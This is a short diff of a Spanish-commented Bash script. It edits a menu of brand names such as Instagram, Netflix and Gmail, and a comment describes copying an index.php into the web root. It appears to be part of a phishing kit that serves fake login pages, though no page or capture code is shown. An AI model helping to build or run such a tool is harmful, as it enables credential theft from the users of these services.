@@ -1,8 +1,8 @@
 #!/bin/bash
-echo "[1]. Instagram    [2]. Facebook(?) [3]. LinkedIn"
-echo "[4]. Discord      [5]. Netflix     [6]. Yahoo"
-echo "[7]. ?            [8]. Dropbox     [9]. Ebay"
-echo "[10]. GitHub      [11]. Microsoft  [12]. Gmail"
+echo "[1]. Instagram    [2]. LinkedIn    [3]. Discord"
+echo "[4]. Netflix      [5]. Yahoo       [6]. Dropbox"
+echo "[7]. Ebay         [8]. Github      [9]. Microsoft"
+echo "[10]. Gmail"
 echo "[0]. Salir"
 #Magenta
 echo -e "\e[35m"
@@ -11,7 +11,7 @@ echo -e "\e[0m"
 
 #Guarda las palabras en un array
 
-declare -a paginas=('instagram' 'facebook' 'linkedin' 'discord' 'netflix' 'yahoo' 'linkedin' 'dropbox' 'ebay' 'github' 'microsoft' 'gmail');
+declare -a paginas=('instagram' 'linkedin' 'discord' 'netflix' 'yahoo' 'dropbox' 'ebay' 'github' 'microsoft' 'gmail');
 
 #Si la opción es del 1 al 12, comhtml que el archivo index.php está en /var/www/html/
 #Si está no se hace nada, si NO está se copia a /var/html/www/
